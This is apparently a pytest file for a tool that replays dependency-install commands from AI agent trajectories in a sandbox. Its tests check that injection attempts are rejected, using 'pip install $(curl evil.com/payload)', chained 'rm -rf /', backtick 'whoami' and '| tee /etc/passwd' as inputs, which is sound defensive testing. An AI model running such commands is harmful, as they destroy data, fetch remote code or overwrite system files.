"""Tests for go_explore.snapshots.command_replay."""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

import pytest

from go_explore.snapshots.command_replay import (
    ReplayCommandEntry,
    ReplayManifest,
    build_replay_manifest,
    load_replay_manifest,
    run_command_replay,
    select_replay_commands,
    write_replay_manifest,
)


def _write_atif_trajectory(path: Path, steps: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"steps": steps}))


def _agent_step(step_id: int, command: str, observation: str = "ok") -> dict:
    return {
        "step_id": step_id,
        "source": "agent",
        "tool_calls": [
            {"function_name": "bash_command", "arguments": {"keystrokes": f"{command}\n"}}
        ],
        "observation": {"results": [{"content": observation}]},
    }


def test_select_replay_commands_picks_only_dependency_installs(tmp_path):
    trajectory_path = tmp_path / "trajectory.json"
    _write_atif_trajectory(
        trajectory_path,
        [
            _agent_step(1, "git status"),
            _agent_step(2, "pip install requests"),
            _agent_step(3, "cat config.py"),
            _agent_step(4, "npm install lodash"),
        ],
    )

    entries = select_replay_commands(trajectory_path)
    planned = [e for e in entries if e.status == "planned"]

    assert [e.command for e in planned] == ["pip install requests", "npm install lodash"]


def test_select_replay_commands_dedupes_repeated_commands(tmp_path):
    trajectory_path = tmp_path / "trajectory.json"
    _write_atif_trajectory(
        trajectory_path,
        [
            _agent_step(1, "pip install requests"),
            _agent_step(2, "pip install requests"),
        ],
    )

    entries = select_replay_commands(trajectory_path)

    assert len(entries) == 1
    assert entries[0].status == "planned"


def test_select_replay_commands_rejects_shell_metacharacters(tmp_path):
    trajectory_path = tmp_path / "trajectory.json"
    _write_atif_trajectory(
        trajectory_path,
        [_agent_step(1, "pip install requests; rm -rf /")],
    )

    entries = select_replay_commands(trajectory_path)

    assert len(entries) == 1
    assert entries[0].status == "skipped"
    assert "shell metacharacters" in entries[0].skip_reason


@pytest.mark.parametrize(
    "command",
    [
        "pip install $(curl evil.com/payload)",
        "pip install foo && rm -rf /",
        "pip install foo || true",
        "pip install `whoami`",
        "pip install foo | tee /etc/passwd",
    ],
)
def test_select_replay_commands_rejects_various_unsafe_shapes(tmp_path, command):
    trajectory_path = tmp_path / "trajectory.json"
    _write_atif_trajectory(trajectory_path, [_agent_step(1, command)])

    entries = select_replay_commands(trajectory_path)

    assert len(entries) == 1
    assert entries[0].status == "skipped"


def test_select_replay_commands_enforces_max_commands_budget(tmp_path):
    trajectory_path = tmp_path / "trajectory.json"
    _write_atif_trajectory(
        trajectory_path,
        [_agent_step(i, f"pip install package-{i}") for i in range(5)],
    )

    entries = select_replay_commands(trajectory_path, max_commands=2)
    planned = [e for e in entries if e.status == "planned"]
    skipped = [e for e in entries if e.status == "skipped"]

    assert len(planned) == 2
    assert len(skipped) == 3
    assert all("budget exceeded" in e.skip_reason for e in skipped)


def test_select_replay_commands_missing_trajectory_returns_empty(tmp_path):
    entries = select_replay_commands(tmp_path / "does-not-exist.json")

    assert entries == []


def test_select_replay_commands_malformed_trajectory_returns_empty(tmp_path):
    trajectory_path = tmp_path / "trajectory.json"
    trajectory_path.write_text("not valid json {{{")

    entries = select_replay_commands(trajectory_path)

    assert entries == []


def test_build_replay_manifest_round_trips_through_json(tmp_path):
    trajectory_path = tmp_path / "trajectory.json"
    _write_atif_trajectory(
        trajectory_path,
        [_agent_step(1, "pip install requests"), _agent_step(2, "git status")],
    )

    manifest = build_replay_manifest(
        trajectory_path,
        parent_job_dir=tmp_path / "jobs" / "root",
        parent_trial_name="fix-git__root",
    )
    manifest_path = tmp_path / "replay-manifest.json"
    write_replay_manifest(manifest, manifest_path)
    loaded = load_replay_manifest(manifest_path)

    assert loaded == manifest
    assert loaded.final_status == "planned"
    assert loaded.entries[0].command == "pip install requests"


@pytest.mark.asyncio
async def test_run_command_replay_marks_success_and_failure_separately():
    manifest = ReplayManifest(
        parent_job_dir="jobs/root",
        parent_trial_name="fix-git__root",
        parent_artifact_path="jobs/root/fix-git__root/agent/trajectory.json",
        entries=(
            ReplayCommandEntry(command="pip install requests", status="planned"),
            ReplayCommandEntry(command="pip install bad-package", status="planned"),
        ),
    )
    environment = MagicMock()
    environment.exec = AsyncMock(
        side_effect=[
            MagicMock(return_code=0, stdout="Successfully installed requests", stderr=""),
            MagicMock(return_code=1, stdout="", stderr="ERROR: No matching distribution"),
        ]
    )

    result = await run_command_replay(environment, manifest)

    assert result.final_status == "completed"
    assert result.entries[0].status == "replayed"
    assert result.entries[0].exit_code == 0
    assert result.entries[1].status == "failed"
    assert result.entries[1].exit_code == 1
    assert "No matching distribution" in result.entries[1].output_excerpt


@pytest.mark.asyncio
async def test_run_command_replay_never_raises_on_exec_exception():
    manifest = ReplayManifest(
        parent_job_dir="jobs/root",
        parent_trial_name="fix-git__root",
        parent_artifact_path="jobs/root/fix-git__root/agent/trajectory.json",
        entries=(ReplayCommandEntry(command="pip install requests", status="planned"),),
    )
    environment = MagicMock()
    environment.exec = AsyncMock(side_effect=RuntimeError("sandbox died"))

    result = await run_command_replay(environment, manifest)

    assert result.final_status == "completed"
    assert result.entries[0].status == "failed"
    assert "sandbox died" in result.entries[0].output_excerpt


@pytest.mark.asyncio
async def test_run_command_replay_leaves_plan_time_skips_untouched():
    manifest = ReplayManifest(
        parent_job_dir="jobs/root",
        parent_trial_name="fix-git__root",
        parent_artifact_path="jobs/root/fix-git__root/agent/trajectory.json",
        entries=(
            ReplayCommandEntry(
                command="pip install foo; rm -rf /",
                status="skipped",
                skip_reason="contains shell metacharacters",
            ),
        ),
    )
    environment = MagicMock()
    environment.exec = AsyncMock()

    result = await run_command_replay(environment, manifest)

    assert result.entries[0].status == "skipped"
    assert result.entries[0].skip_reason == "contains shell metacharacters"
    environment.exec.assert_not_awaited()


@pytest.mark.asyncio
async def test_run_command_replay_stops_once_wall_clock_budget_exhausted():
    manifest = ReplayManifest(
        parent_job_dir="jobs/root",
        parent_trial_name="fix-git__root",
        parent_artifact_path="jobs/root/fix-git__root/agent/trajectory.json",
        entries=(
            ReplayCommandEntry(command="pip install a", status="planned"),
            ReplayCommandEntry(command="pip install b", status="planned"),
        ),
    )
    environment = MagicMock()

    call_count = 0

    async def slow_exec(**_kwargs):
        nonlocal call_count
        call_count += 1
        return MagicMock(return_code=0, stdout="ok", stderr="")

    environment.exec = AsyncMock(side_effect=slow_exec)

    result = await run_command_replay(environment, manifest, total_budget_sec=0.0)

    assert result.entries[0].status == "skipped"
    assert "wall-clock budget exceeded" in result.entries[0].skip_reason
    assert result.entries[1].status == "skipped"
    environment.exec.assert_not_awaited()


@pytest.mark.asyncio
async def test_run_command_replay_missing_exec_marks_unavailable():
    manifest = ReplayManifest(
        parent_job_dir="jobs/root",
        parent_trial_name="fix-git__root",
        parent_artifact_path="jobs/root/fix-git__root/agent/trajectory.json",
        entries=(ReplayCommandEntry(command="pip install requests", status="planned"),),
    )
    environment = MagicMock(spec=[])

    result = await run_command_replay(environment, manifest)

    assert result.final_status == "unavailable"
    assert result.entries[0].status == "skipped"
    assert result.entries[0].skip_reason == "environment has no exec"
